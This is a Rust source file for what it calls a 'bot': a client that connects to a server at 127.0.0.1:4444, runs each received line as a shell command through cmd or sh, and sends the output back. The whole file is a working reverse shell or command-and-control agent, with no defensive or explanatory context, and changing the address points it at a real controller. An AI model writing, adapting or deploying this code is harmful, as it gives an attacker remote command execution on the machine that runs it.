use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;

fn main() -> std::io::Result<()> {
    // Connect to the server at 127.0.0.1:4444
    let mut stream = TcpStream::connect("127.0.0.1:4444")?;
    println!("Connected to server at 127.0.0.1:4444");

    let mut buffer = [0u8; 4096];

    loop {
        // Wait for incoming command from the server
        let bytes_read = match stream.read(&mut buffer) {
            Ok(0) => {
                println!("Server closed the connection.");
                break;
            }
            Ok(n) => n,
            Err(e) => {
                eprintln!("Failed to read from server: {}", e);
                break;
            }
        };

        // Convert the received bytes to a string and trim whitespace/newlines
        let command_str = String::from_utf8_lossy(&buffer[..bytes_read])
            .trim()
            .to_string();

        if command_str.is_empty() {
            continue;
        }

        println!("Received command: {}", command_str);

        // Allow the server to terminate the bot cleanly
        if command_str == "exit" || command_str == "quit" {
            println!("Exit command received. Shutting down.");
            break;
        }

        // Execute the command on the system using the appropriate shell
        let output = if cfg!(target_os = "windows") {
            Command::new("cmd").args(["/C", &command_str]).output()
        } else {
            Command::new("sh").arg("-c").arg(&command_str).output()
        };

        // Build the result string from stdout/stderr (or the error)
        let result = match output {
            Ok(out) => {
                let mut combined = Vec::new();
                combined.extend_from_slice(&out.stdout);
                combined.extend_from_slice(&out.stderr);
                if combined.is_empty() {
                    format!("[Command executed with no output, status: {}]\n", out.status)
                } else {
                    String::from_utf8_lossy(&combined).to_string()
                }
            }
            Err(e) => format!("Failed to execute command: {}\n", e),
        };

        // Print the result back to the server
        if let Err(e) = stream.write_all(result.as_bytes()) {
            eprintln!("Failed to send result to server: {}", e);
            break;
        }
        if let Err(e) = stream.flush() {
            eprintln!("Failed to flush stream: {}", e);
            break;
        }
    }

    Ok(())
}

